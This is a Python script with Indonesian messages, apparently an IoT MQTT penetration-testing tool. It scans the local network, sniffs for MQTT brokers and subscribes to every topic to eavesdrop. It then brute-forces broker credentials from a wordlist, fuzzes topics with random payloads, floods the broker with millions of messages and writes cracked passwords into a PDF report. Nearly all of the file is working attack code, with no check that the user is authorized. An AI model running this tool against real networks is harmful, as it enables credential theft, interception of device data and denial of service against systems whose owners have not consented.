#!/usr/bin/env python3
import os
import sys
import time
import nmap
import netifaces
import ipaddress
import paho.mqtt.client as mqtt
import random
import string
import threading
import statistics
from scapy.all import sniff, IP, TCP, send, RandShort
from colorama import Fore, Style, init
from prettytable import PrettyTable
from reportlab.lib.pagesizes import A4
from reportlab.pdfgen import canvas
from datetime import datetime


init()

sniffed_topics = set()
brute_force_credentials = {"username": None, "password": None}

def get_active_interface():
    interfaces = netifaces.interfaces()
    for iface in interfaces:
        if iface.startswith('lo'):
            continue
        addrs = netifaces.ifaddresses(iface)
        if netifaces.AF_INET in addrs:
            return iface
    print(f"{Fore.RED}[!] Tidak ditemukan interface aktif!{Style.RESET_ALL}")
    sys.exit(1)

def get_network_cidr(iface):
    addrs = netifaces.ifaddresses(iface)
    ip_info = addrs[netifaces.AF_INET][0]
    ip = ip_info['addr']
    netmask = ip_info['netmask']
    cidr = sum(bin(int(x)).count('1') for x in netmask.split('.'))
    network = ipaddress.IPv4Network(f"{ip}/{cidr}", strict=False)
    return str(network)

def scan_network(iface):
    network_cidr = get_network_cidr(iface)
    print(f"{Fore.CYAN}[*] Memulai pemindaian pada {network_cidr}...{Style.RESET_ALL}")
    nm = nmap.PortScanner()
    nm.scan(hosts=network_cidr, arguments="-sn")

    table = PrettyTable()
    table.field_names = ["No", "IP Address", "MAC Address", "Vendor"]
    devices = []

    no = 1
    for host in nm.all_hosts():
        mac = nm[host]['addresses'].get('mac', 'Unknown MAC')
        vendor = nm[host]['vendor'].get(mac, 'Unknown Vendor')
        devices.append(host)
        table.add_row([no, host, mac, vendor])
        no += 1

    print(f"\n[+] Pemindaian selesai. {len(devices)} perangkat ditemukan.")
    print(table)

    return devices

def scan_mqtt_ports(network_cidr):
    print(f"{Fore.CYAN}[*] Memindai jaringan untuk port MQTT (1883, 8883)...{Style.RESET_ALL}")
    nm = nmap.PortScanner()
    nm.scan(hosts=network_cidr, arguments="-p 1883,8883 --open")
    mqtt_hosts = []
    for host in nm.all_hosts():
        if 'tcp' in nm[host]:
            if 1883 in nm[host]['tcp'] or 8883 in nm[host]['tcp']:
                mqtt_hosts.append(host)
    return mqtt_hosts

def mqtt_enum_broker(broker_ip, username=None, password=None):
    print(f"{Fore.GREEN}[*] Menghubungi broker MQTT di {broker_ip}:1883{Style.RESET_ALL}")

    def on_connect(client, userdata, flags, rc):
        if rc == 0:
            print(f"{Fore.GREEN}[+] Berhasil terhubung ke broker!{Style.RESET_ALL}")
            client.subscribe("#")
        else:
            print(f"{Fore.RED}[-] Koneksi ditolak, kode: {rc}{Style.RESET_ALL}")
            client.disconnect()  # Stop, brute force dilakukan di main()

    def on_message(client, userdata, msg):
        print(f"{Fore.CYAN}[MQTT] Topic: {msg.topic} | Payload: {msg.payload.decode(errors='ignore')}{Style.RESET_ALL}")
        sniffed_topics.add(msg.topic)

    client = mqtt.Client()
    if username and password:
        client.username_pw_set(username, password)
    else:
        # fallback ke hasil brute force jika ada
        if brute_force_credentials["username"] and brute_force_credentials["password"]:
            client.username_pw_set(
                brute_force_credentials["username"],
                brute_force_credentials["password"]
            )

    client.on_connect = on_connect
    client.on_message = on_message

    try:
        client.connect(broker_ip, 1883, 60)
        client.loop_start()
        time.sleep(30)  # kasih waktu sniff lebih panjang (bisa 30-60 detik)
        client.loop_stop()
        client.disconnect()
        print(f"{Fore.GREEN}[✓] Sniffing selesai untuk broker {broker_ip}.{Style.RESET_ALL}")

    except Exception as e:
        print(f"{Fore.RED}[!] Error koneksi ke broker {broker_ip}: {e}{Style.RESET_ALL}")

def mqtt_brute_force_combined(broker_ip):
    print(f"\n{Fore.YELLOW}[*] Melakukan brute force dengan wordlist.txt di {broker_ip}...{Style.RESET_ALL}")
    
    if not os.path.exists("wordlist.txt"):
        print(f"{Fore.RED}[!] File wordlist.txt tidak ditemukan!{Style.RESET_ALL}")
        return None

    with open("wordlist.txt", encoding='utf-8', errors='ignore') as f:
        credentials = [line.strip().split(":") for line in f if ":" in line]

    for username, password in credentials:
        success = {"ok": False}

        def on_connect(client, userdata, flags, rc):
            success["ok"] = (rc == 0)

        client = mqtt.Client()
        client.username_pw_set(username, password)
        client.on_connect = on_connect

        try:
            client.connect(broker_ip, 1883, 5)
            client.loop_start()
            time.sleep(2)
            client.loop_stop()
            client.disconnect()

            if success["ok"]:
                print(f"{Fore.GREEN}[+] Ditemukan kredensial valid: {username}:{password}{Style.RESET_ALL}")
                
                # Update global credentials
                brute_force_credentials["username"] = username
                brute_force_credentials["password"] = password

                # Kembalikan tuple juga jika mau dipakai lokal
                return (username, password)
            else:
                print(f"{Fore.RED}[-] Kredensial salah: {username}:{password}{Style.RESET_ALL}")

        except Exception as e:
            print(f"{Fore.RED}[-] Gagal login {username}:{password} - {e}{Style.RESET_ALL}")

    print(f"{Fore.RED}[!] Tidak ada kredensial yang valid ditemukan.{Style.RESET_ALL}")
    return None

def sniff_broker_from_iot(iot_ip, interface, duration=30):
    print(f"{Fore.YELLOW}[*] Mendeteksi broker yang berkomunikasi dengan {iot_ip}...{Style.RESET_ALL}")
    broker_ips = set()

    print(f"{Fore.CYAN}[*] Sniffing komunikasi MQTT selama {duration} detik...{Style.RESET_ALL}")

    def packet_callback(pkt):
        if IP in pkt and TCP in pkt:
            if pkt[TCP].dport in [1883, 8883]:
                broker_ips.add(pkt[IP].dst)
            elif pkt[TCP].sport in [1883, 8883]:
                broker_ips.add(pkt[IP].src)

    sniff(iface=interface, filter="tcp port 1883 or tcp port 8883", prn=packet_callback, timeout=duration)

    if not broker_ips:
        network_cidr = get_network_cidr(interface)
        mqtt_hosts = scan_mqtt_ports(network_cidr)
        broker_ips.update(mqtt_hosts)

    return list(broker_ips)

def mqtt_fuzz_broker(broker_ip, username=None, password=None, iterations=20):
    print(f"{Fore.YELLOW}[*] Melakukan MQTT fuzzing ke broker {broker_ip}...{Style.RESET_ALL}")
    
    def generate_fuzz_payload():
        length = random.randint(1, 256)
        chars = string.ascii_letters + string.digits + string.punctuation + ''.join(chr(i) for i in range(32))
        return ''.join(random.choice(chars) for _ in range(length))

    client = mqtt.Client()
    if username and password:
        client.username_pw_set(username, password)

    try:
        client.connect(broker_ip, 1883, 60)
        client.loop_start()
        for i in range(iterations):
            if sniffed_topics:
                topic = random.choice(list(sniffed_topics))
            else:
                topic = "fuzz/test"

            payload = generate_fuzz_payload()
            try:
                client.publish(topic, payload)
                print(f"{Fore.CYAN}[Fuzz] Sent to {topic} | Payload: {payload[:30]}...{Style.RESET_ALL}")
            except Exception as e:
                print(f"{Fore.RED}[!] Gagal publish ke {topic} - {e}{Style.RESET_ALL}")
            time.sleep(0.2)
        client.loop_stop()
        client.disconnect()
    except Exception as e:
        print(f"{Fore.RED}[!] Gagal koneksi ke broker {broker_ip} - {e}{Style.RESET_ALL}")

def generate_pdf_report(broker_ip, username, password, topics, fuzz_count, flood_info, qos_delay_summary):
    filename = f"report_{broker_ip.replace('.', '_')}.pdf"
    c = canvas.Canvas(filename, pagesize=A4)
    width, height = A4

    # ==== HEADER ====
    c.setFont("Helvetica-Bold", 18)
    c.drawString(50, height - 50, "Laporan Pengujian Keamanan MQTT")
    c.setFont("Helvetica", 12)
    c.drawString(50, height - 70, "Penetration Testing Report - IoT MQTT Broker")
    c.line(50, height - 75, width - 50, height - 75)

    # ==== INFO TARGET ====
    y = height - 100
    c.setFont("Helvetica-Bold", 14)
    c.drawString(50, y, "Informasi Target")
    c.setFont("Helvetica", 11)
    y -= 20
    c.drawString(60, y, f"Tanggal: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    y -= 15
    c.drawString(60, y, f"Broker IP: {broker_ip}")
    y -= 15
    c.drawString(60, y, f"Username: {username or 'N/A'}")
    y -= 15
    c.drawString(60, y, f"Password: {password or 'N/A'}")

    # ==== HASIL SNIFF TOPIK ====
    y -= 30
    c.setFont("Helvetica-Bold", 14)
    c.drawString(50, y, "Topik MQTT yang Disadap")
    y -= 20
    c.setFont("Helvetica", 11)
    if topics:
        for idx, topic in enumerate(list(topics)[:15], start=1):
            c.drawString(60, y, f"{idx}. {topic}")
            y -= 15
            if y < 100:
                c.showPage()
                y = height - 50
    else:
        c.drawString(60, y, "Tidak ada topik yang berhasil di-sniff.")

    # ==== HASIL FUZZING ====
    y -= 30
    c.setFont("Helvetica-Bold", 14)
    c.drawString(50, y, "Hasil Fuzzing")
    y -= 20
    c.setFont("Helvetica", 11)
    c.drawString(60, y, f"Jumlah Payload Dikirim: {fuzz_count}")

    # ==== INFO SUBSCRIBE FLOOD ====
    y -= 30
    c.setFont("Helvetica-Bold", 14)
    c.drawString(50, y, "Informasi Subscribe Flood")
    y -= 20
    c.setFont("Helvetica", 11)
    c.drawString(60, y, f"Jumlah Topik: {flood_info['topic_count']}")
    y -= 15
    c.drawString(60, y, f"Pesan per Topik: {flood_info['messages_per_topic']}")

    # ==== RINGKASAN QoS ====
    y -= 30
    c.setFont("Helvetica-Bold", 14)
    c.drawString(50, y, "Ringkasan Delay Maksimum per QoS")
    y -= 20
    c.setFont("Helvetica", 11)
    for qos_level, delay in qos_delay_summary.items():
        text = f"QoS {qos_level}: {'Gagal' if delay == -1 else f'{delay:.3f} detik'}"
        c.drawString(60, y, text)
        y -= 15
        if y < 100:
            c.showPage()
            y = height - 50

    # ==== FOOTER ====
    c.setFont("Helvetica-Oblique", 9)
    c.drawString(50, 30, "Generated by MQTT Penetration Testing Tool © 2025")
    c.drawRightString(width - 50, 30, f"{datetime.now().strftime('%d/%m/%Y %H:%M')}")

    c.showPage()
    c.save()
    print(f"{Fore.GREEN}[✓] Laporan PDF disimpan sebagai {filename}{Style.RESET_ALL}")

    
def mqtt_qos_delay_test(broker_ip, username=None, password=None, retain=False, delay=0.005):
    from time import time, sleep
    print(f"{Fore.YELLOW}[*] Menjalankan MQTT QoS Delay Test ke {broker_ip}...{Style.RESET_ALL}")

    qos_levels = [0, 1, 2]
    topic_stages = [100, 250, 500, 1000]
    max_publish_delay = {}

    # Ambil dari brute force jika kosong
    username = username or brute_force_credentials["username"]
    password = password or brute_force_credentials["password"]

    for qos_level in qos_levels:
        print(f"{Fore.CYAN}[+] QoS {qos_level} testing...{Style.RESET_ALL}")
        client = mqtt.Client()
        if username and password:
            client.username_pw_set(username, password)

        try:
            client.connect(broker_ip, 1883, 60)
            client.loop_start()
            sleep(1)

            start_time = time()
            stage_index = 0
            topic_base = f"flood/qos{qos_level}"
            max_delay = 0

            while time() - start_time < 60:
                if stage_index >= len(topic_stages):
                    break
                current_topics = topic_stages[stage_index]
                stage_index += 1

                topics = []
                for i in range(current_topics):
                    topic = f"{topic_base}/topic{i}"
                    client.subscribe(topic, qos=qos_level)
                    topics.append(topic)
                    sleep(delay)

                for topic in topics:
                    payload = f"FLOOD_{topic}"
                    t0 = time()
                    result = client.publish(topic, payload, qos=qos_level, retain=retain)
                    if qos_level > 0:
                        result.wait_for_publish()
                    t1 = time()
                    pub_delay = t1 - t0
                    max_delay = max(max_delay, pub_delay)
                    if time() - start_time > 60:
                        break

            client.loop_stop()
            client.disconnect()
            max_publish_delay[qos_level] = max_delay
            print(f"{Fore.GREEN}[✓] QoS {qos_level} selesai | Max Delay: {max_delay:.3f}s{Style.RESET_ALL}")

        except Exception as e:
            print(f"{Fore.RED}[!] QoS {qos_level} gagal - {e}{Style.RESET_ALL}")
            max_publish_delay[qos_level] = -1

    print(f"{Fore.MAGENTA}=== Ringkasan Delay per QoS ==={Style.RESET_ALL}")
    for qos in qos_levels:
        d = max_publish_delay[qos]
        print(f"QoS {qos} : {'Gagal' if d == -1 else f'{d:.3f} detik'}")

    return max_publish_delay

def mqtt_subscribe_publish(broker_ip, topic_count=1000, messages_per_topic=3000, qos=0, retain=False, delay=0.005):
    from time import sleep
    print(f"{Fore.YELLOW}[*] Menjalankan Subscribe + Publish Flood ke {broker_ip}...{Style.RESET_ALL}")

    username = brute_force_credentials["username"]
    password = brute_force_credentials["password"]

    client = mqtt.Client()
    if username and password:
        client.username_pw_set(username, password)

    try:
        client.connect(broker_ip, 1883, 60)
        client.loop_start()

        topics = []
        for i in range(topic_count):
            topic = f"flood/topic/{i}"
            client.subscribe(topic)
            topics.append(topic)
            sleep(delay)

        print(f"{Fore.GREEN}[✓] Subscribe {topic_count} topik selesai. Mulai publish...{Style.RESET_ALL}")
        sleep(1)

        for topic in topics:
            for j in range(messages_per_topic):
                payload = f"FLOOD_{topic}_{j}"
                client.publish(topic, payload, qos=qos, retain=retain)

        print(f"{Fore.GREEN}[✓] Publish Flood selesai.{Style.RESET_ALL}")
        input(f"{Fore.YELLOW}Tekan Enter untuk stop & unsubscribe...{Style.RESET_ALL}")
        client.loop_stop()
        client.disconnect()

    except Exception as e:
        print(f"{Fore.RED}[!] Subscribe Flood gagal - {e}{Style.RESET_ALL}")

if __name__ == "__main__":
    if os.geteuid() != 0:
        print(f"{Fore.RED}Jalankan dengan sudo!{Style.RESET_ALL}")
        sys.exit(1)

    iface = get_active_interface()
    iot_devices = scan_network(iface)

    if not iot_devices:
        print(f"{Fore.RED}[-] Tidak ada perangkat IoT ditemukan.{Style.RESET_ALL}")
        sys.exit(0)

    choice = int(input(f"\n{Fore.CYAN}[?] Pilih nomor perangkat (1-{len(iot_devices)}): {Style.RESET_ALL}"))
    if 1 <= choice <= len(iot_devices):
        selected_ip = iot_devices[choice - 1]
        brokers = sniff_broker_from_iot(selected_ip, iface)

        if not brokers:
            print(f"{Fore.YELLOW}[*] Tidak ditemukan broker MQTT dari perangkat tersebut.{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}[*] Mencoba scan jaringan untuk broker MQTT...{Style.RESET_ALL}")
            network_cidr = get_network_cidr(iface)
            brokers = scan_mqtt_ports(network_cidr)

        if brokers:
            print(f"{Fore.GREEN}[+] Broker MQTT ditemukan: {brokers}{Style.RESET_ALL}")
            for broker_ip in brokers:
                # coba enum langsung
                mqtt_enum_broker(broker_ip)

                # jika tidak ada topik, mungkin butuh brute force + reconnect
                if not sniffed_topics:
                    do_brute = input(f"{Fore.YELLOW}[?] Broker {broker_ip} membutuhkan login? Lakukan brute force? (y/n): {Style.RESET_ALL}")
                    if do_brute.lower() == 'y':
                        result = mqtt_brute_force_combined(broker_ip)
                        if result:
                            mqtt_enum_broker(
                                broker_ip,
                                username=brute_force_credentials["username"],
                                password=brute_force_credentials["password"]
                            )

                # tampilkan hasil sniffing
                if sniffed_topics:
                    print(f"{Fore.GREEN}[+] Hasil Topik MQTT yang di-sniffing:{Style.RESET_ALL}")
                    for topic in sniffed_topics:
                        print(f" - {topic}")
                else:
                    print(f"{Fore.RED}[-] Tidak ada topik yang di-sniff.{Style.RESET_ALL}")

                # serangan tambahan
                do_fuzz = input(f"{Fore.YELLOW}[?] Lakukan MQTT Fuzzing ke {broker_ip}? (y/n): {Style.RESET_ALL}")
                if do_fuzz.lower() == 'y':
                    mqtt_fuzz_broker(
                        broker_ip,
                        username=brute_force_credentials["username"],
                        password=brute_force_credentials["password"]
                    )

                do_qos = input(f"{Fore.YELLOW}[?] Lakukan MQTT QoS Delay Test ke {broker_ip}? (y/n): {Style.RESET_ALL}")
                if do_qos.lower() == 'y':
                    mqtt_qos_delay_test(
                        broker_ip,
                        username=brute_force_credentials["username"],
                        password=brute_force_credentials["password"]
                    )

                do_flood = input(f"{Fore.YELLOW}[?] Lakukan Subscribe + Publish Flood ke {broker_ip}? (y/n): {Style.RESET_ALL}")
                if do_flood.lower() == 'y':
                    mqtt_subscribe_publish(broker_ip)

                do_report = input(f"{Fore.YELLOW}[?] Buatkan laporan PDF untuk {broker_ip}? (y/n): {Style.RESET_ALL}")
                if do_report.lower() == 'y':
                    generate_pdf_report(
                        broker_ip=broker_ip,
                        username=brute_force_credentials["username"],
                        password=brute_force_credentials["password"],
                        topics=sniffed_topics,
                        fuzz_count=20,
                        flood_info={"topic_count": "1000", "messages_per_topic": "3000"},
                        qos_delay_summary={"0": 0.0, "1": 0.0, "2": 0.0}
                    )
        else:
            print(f"{Fore.RED}[-] Tidak ada broker MQTT ditemukan di jaringan.{Style.RESET_ALL}")
    else:
        print(f"{Fore.RED}[!] Pilihan tidak valid.{Style.RESET_ALL}")
